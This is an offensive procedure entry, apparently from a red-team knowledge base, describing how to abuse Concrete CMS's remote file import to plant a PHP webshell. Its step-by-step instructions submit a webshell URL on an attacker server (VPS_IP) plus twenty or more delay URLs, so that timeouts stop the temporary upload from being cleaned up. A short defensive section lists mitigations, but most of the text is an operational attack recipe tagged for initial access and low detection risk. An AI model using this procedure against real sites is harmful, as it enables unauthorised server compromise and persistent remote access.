---
tags:
  - file-upload
  - remote-import
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 528c28d6-0e2e-4596-9f5c-7af32ad6bc8a
created_at: '2025-12-14T17:23:28.015Z'
updated_at: '2025-12-14T17:23:28.015Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Import-Remote-Files-to-Trigger-Delay

## Summary

This procedure uses the Concrete CMS file manager to import a malicious PHP file from a remote URL, combined with multiple delaying URLs to exceed processing limits and prevent cleanup.

## Description

Targeting the remote URL import in the file manager, this step submits one webshell URL and over 20 delay URLs. The lack of extension validation in downloadRemoteURL allows PHP upload to /application/files/[temp_dir], while delays ensure timeout before VolatileDirectory cleanup.

## Requirements

1. Admin access to file manager
2. Running malicious server with webshell and delay endpoints
3. Web browser for CMS interaction

## Defense

Defensive measures and detection strategies:

- Validate and whitelist remote URLs in file imports
- Limit concurrent imports and enforce timeouts with cleanup
- Log all remote download attempts

## Objectives

1. Download malicious PHP to temp directory
2. Overload process with delays for persistence
3. Initiate the upload without immediate rejection

## Instructions

### Step 1: Navigate to File Manager

**Context**: Access the upload section in the admin dashboard.

No command; go to 'Upload files' > 'Add files' > 'Remote files'.

> Interface loads for URL input.

### Step 2: Submit URLs

**Context**: Enter the webshell URL and multiple delay URLs to start import.

No command; paste http://VPS_IP:8877/byc.php once and http://VPS_IP:8877/stuck 20+ times, then submit.

> Import begins; monitor server for requests.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[file-upload]]
- [[concrete-cms]]
